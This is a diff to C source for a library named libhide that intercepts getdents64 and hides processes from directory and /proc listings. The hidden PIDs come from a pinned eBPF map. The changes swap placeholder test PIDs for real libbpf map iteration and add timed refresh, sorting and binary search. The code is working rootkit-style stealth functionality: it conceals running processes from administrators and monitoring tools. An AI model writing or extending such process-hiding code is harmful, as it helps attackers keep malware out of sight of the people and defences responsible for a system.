@@ -12,6 +12,7 @@
 #include <stdarg.h>
 #include <regex.h>
 #include <sys/syscall.h>
+#include <time.h>
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
 
@@ -53,10 +54,55 @@ static long (*real_getdents64)(int fd, void *dirp, size_t count) = NULL;
 
 static long filter_getdents64_entries(void *dirp, long bytes_read);
 static void load_hidden_pids_from_bpf_map(void);
+static int open_bpf_map(void);
+static int refresh_hidden_pids_if_needed(void);
+static void close_bpf_map(void);
 
 /* =====================================================
  *  Helper Functions
  * ===================================================== */
+
+/* Open BPF map file descriptor with connection pooling */
+static int open_bpf_map(void) {
+    if (bpf_map_fd >= 0) {
+        return bpf_map_fd; /* Already open */
+    }
+
+    /* Try to open pinned BPF map */
+    bpf_map_fd = bpf_obj_get(BPF_MAP_PATH);
+    if (bpf_map_fd < 0) {
+        /* Map not available - this is normal if eBPF program not loaded */
+        return -1;
+    }
+
+    return bpf_map_fd;
+}
+
+/* Close BPF map file descriptor */
+static void close_bpf_map(void) {
+    if (bpf_map_fd >= 0) {
+        close(bpf_map_fd);
+        bpf_map_fd = -1;
+    }
+}
+
+/* Refresh hidden PIDs if needed (time-based with optimization) */
+static int refresh_hidden_pids_if_needed(void) {
+    time_t current_time = time(NULL);
+
+    /* Check if refresh is needed */
+    if (current_time - last_refresh < REFRESH_INTERVAL) {
+        return 0; /* No refresh needed */
+    }
+
+    /* Update last refresh time */
+    last_refresh = current_time;
+
+    /* Reload PIDs from BPF map */
+    load_hidden_pids_from_bpf_map();
+
+    return 1; /* Refresh performed */
+}
 
 /* Initialize library and load hidden PIDs from BPF map */
 static void init_libhide(void) {
@@ -82,33 +128,100 @@ static void init_libhide(void) {
     initialized = 1;
 }
 
-/* Load hidden PIDs from BPF map */
+/* Load hidden PIDs from BPF map using real libbpf integration */
 static void load_hidden_pids_from_bpf_map(void) {
     hidden_count = 0;
 
-    /* FIXED: Use direct BPF map access instead of popen() to avoid infinite loop */
-    /* For now, we'll use a simple approach - check if map file exists */
-    /* In production, this should use libbpf to read the map directly */
+    /* Try to open BPF map */
+    if (open_bpf_map() < 0) {
+        /* BPF map not available - fallback to empty list */
+        return;
+    }
 
-    /* Temporary: Add some test PIDs for verification */
-    /* This will be replaced with proper BPF map reading */
-    hidden_pids[0] = 999999; /* Test PID that doesn't exist */
-    hidden_count = 1;
+    /* Iterate through BPF map to get all hidden PIDs */
+    uint32_t key = 0;
+    uint32_t next_key;
+    uint32_t value;
+    int ret;
 
-    /* TODO: Implement proper BPF map reading using libbpf */
-    /* This requires linking with libbpf and using bpf_map__lookup_elem */
-}
+    /* Get first key */
+    ret = bpf_map_get_next_key(bpf_map_fd, NULL, &key);
+    if (ret != 0) {
+        /* Map is empty or error occurred */
+        return;
+    }
 
-/* Check if PID should be hidden */
-static int is_hidden_pid(int pid) {
-    init_libhide();
-    
-    for (int i = 0; i < hidden_count; i++) {
-        if (hidden_pids[i] == pid) {
-            return 1;
+    /* Iterate through all keys in the map */
+    do {
+        /* Lookup value for current key */
+        ret = bpf_map_lookup_elem(bpf_map_fd, &key, &value);
+        if (ret == 0 && value == 1) {
+            /* This PID is marked as hidden */
+            if (hidden_count < MAX_HIDDEN_PIDS) {
+                hidden_pids[hidden_count] = (int)key;
+                hidden_count++;
+            } else {
+                /* Array is full - log warning but continue */
+                break;
+            }
+        }
+
+        /* Get next key */
+        ret = bpf_map_get_next_key(bpf_map_fd, &key, &next_key);
+        if (ret != 0) {
+            break; /* No more keys */
+        }
+        key = next_key;
+
+    } while (hidden_count < MAX_HIDDEN_PIDS);
+
+    /* Sort PIDs for binary search optimization */
+    if (hidden_count > 1) {
+        /* Simple bubble sort for small arrays */
+        for (int i = 0; i < hidden_count - 1; i++) {
+            for (int j = 0; j < hidden_count - i - 1; j++) {
+                if (hidden_pids[j] > hidden_pids[j + 1]) {
+                    int temp = hidden_pids[j];
+                    hidden_pids[j] = hidden_pids[j + 1];
+                    hidden_pids[j + 1] = temp;
+                }
+            }
         }
     }
-    return 0;
+}
+
+/* Check if PID should be hidden with real-time refresh and optimization */
+static int is_hidden_pid(int pid) {
+    init_libhide();
+
+    /* Refresh hidden PIDs from BPF map if needed */
+    refresh_hidden_pids_if_needed();
+
+    /* Optimized binary search for large PID lists */
+    if (hidden_count > 10) {
+        /* Use binary search for better performance */
+        int left = 0, right = hidden_count - 1;
+        while (left <= right) {
+            int mid = left + (right - left) / 2;
+            if (hidden_pids[mid] == pid) {
+                return 1;
+            }
+            if (hidden_pids[mid] < pid) {
+                left = mid + 1;
+            } else {
+                right = mid - 1;
+            }
+        }
+        return 0;
+    } else {
+        /* Use linear search for small lists */
+        for (int i = 0; i < hidden_count; i++) {
+            if (hidden_pids[i] == pid) {
+                return 1;
+            }
+        }
+        return 0;
+    }
 }
 
 /* Check if path is /proc/[PID] */
@@ -422,5 +535,6 @@ void libhide_init(void) {
 
 __attribute__((destructor))
 void libhide_cleanup(void) {
-    /* Cleanup if needed */
+    /* Close BPF map file descriptor */
+    close_bpf_map();
 }
